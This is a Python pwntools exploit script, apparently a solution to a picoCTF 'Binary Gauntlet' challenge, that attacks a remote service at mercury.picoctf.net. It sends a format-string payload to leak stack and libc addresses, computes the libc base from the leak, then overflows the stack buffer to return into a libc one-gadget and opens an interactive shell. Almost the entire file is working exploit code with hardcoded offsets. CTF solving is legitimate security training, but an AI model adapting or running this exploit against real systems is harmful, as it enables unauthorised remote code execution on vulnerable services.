import sys
from pwn import *

'''
With buff loc given:
BUFF LOC = 0x7fffffffeb40

602260 7ffff7dcf8d0 602435 603855 0 7fffffffec98 100000000 0
0 9 7ffff7dd5660 7fffffffebc8 f0b5ff 1 40079d 7ffff7de3b40
0 400750 4005a0 7fffffffec90 602260 400750 7ffff7a03bf7 1
7fffffffec98 100008000 400687 0 e29e5590ec798861 4005a0 7fffffffec90 0
0 1d61aaef35598861 1d61ba5095878861 7fff00000000 0 0 7ffff7de38d3 7ffff7dc9638
4f546 0 0 0 4005a0 7fffffffec90 4005ca 7fffffffec88
1c 1 7fffffffee50 0 7fffffffee98 7fffffffeea5 7fffffffeeae 7fffffffeedd
7fffffffef20 7fffffffef3b 7fffffffef5c 7fffffffef64 0 21 7ffff7ffb000 10
1f8bfbff 6 1000 11 64 3 400040 4
38 5 9 7 7ffff7dd3000 8 0 9
4005a0 b 670 c 670 d 671 e
671 17 0 19 7fffffffee39 1a 0 1f
7fffffffefb0 f 7fffffffee49 0

Base:
0x7ffff79e2000
0x7ffff7bc9000

Without buff loc given:

ebb260 7fa85df778d0 ebb435 ebb845 0 7ffd2c940928 100000000 0
0 9 7fa85df7d660 7ffd2c940858 f0b5ff 1 40077d 7fa85df8bb40
0 400730 4005a0 7ffd2c940920 ebb260 400730 7fa85dbabbf7 1
7ffd2c940928 100008000 400687 0 f91e3c207c715164 4005a0 7ffd2c940920 0
0 6e4658862b15164 64e87d5054f5164 7ffd00000000 0 0 7fa85df8b8d3 7fa85df71638
58134 0 0 0 4005a0 7ffd2c940920 4005ca 7ffd2c940918
1c 1 7ffd2c941e50 0 7ffd2c941e98 7ffd2c941ea5 7ffd2c941eae 7ffd2c941edd
7ffd2c941f20 7ffd2c941f3b 7ffd2c941f5c 7ffd2c941f64 0 21 7ffd2c9af000 10
1f8bfbff 6 1000 11 64 3 400040 4
38 5 9 7 7fa85df7b000 8 0 9
4005a0 b 4d1 c 4d1 d 4d2 e
4d2 17 0 19 7ffd2c940ac9 1a 0 1f
7ffd2c941fb0 f 7ffd2c940ad9 0
'''

# Default glibc used, found through gauntlet1 and gauntlet2
# https://libc.blukat.me/?q=system%3A0x04f550%2Cstr_bin_sh%3A0x1b3e1a&l=libc6_2.27-3ubuntu1.4_amd64
SYSTEM_OFFSET = 0x4f550
PRINTF_OFFSET = 0x64f70
BINSH_OFFSET = 0x1b3e1a

MAIN_LOC = 0x400687
POP_RDI = 0x400793
RET = 0x40053e

# conn = process('./gauntlet')
# conn = remote('mercury.picoctf.net', 23373)  # gauntlet1
# print(conn.recvline())
# conn = remote('mercury.picoctf.net', 48015)  # gauntlet2
conn = remote('mercury.picoctf.net', 15887)  # gauntlet3

# Leak addresses
exp = b'%llx '*100
# exp += b'           '
# for i in range(-50, 0):
# 	exp += '%{}$llx '.format(i).encode()
exp = exp + b'A'*(995-len(exp))
with open('exp', 'wb') as fout:
	fout.write(exp)
conn.sendline(exp)
values = conn.recvline()
print(values)
values = values.split(b' ')
# gdb.attach(conn)

# Get libc base
LIBC_BASE = int(values[1], 16) - 0x3ed8d0
print('libc base:', hex(LIBC_BASE))

# Get correct stack address (calculated using output from Binary Gauntlet 1)
buf_loc = int(values[5], 16)-0x158
print('Bufferloc:', hex(buf_loc))

padding = b'A'*112
ebp = b'B'*8
exp = padding + ebp
# Load /bin/sh into rdi
# exp += p64(0x4006ab)
# exp += p64(POP_RDI)
# exp += p64(LIBC_BASE + BINSH_OFFSET)
# Execute system
exp += p64(LIBC_BASE + 0x4f432)
print(exp)
print(len(exp))

conn.sendline(exp)
conn.interactive()
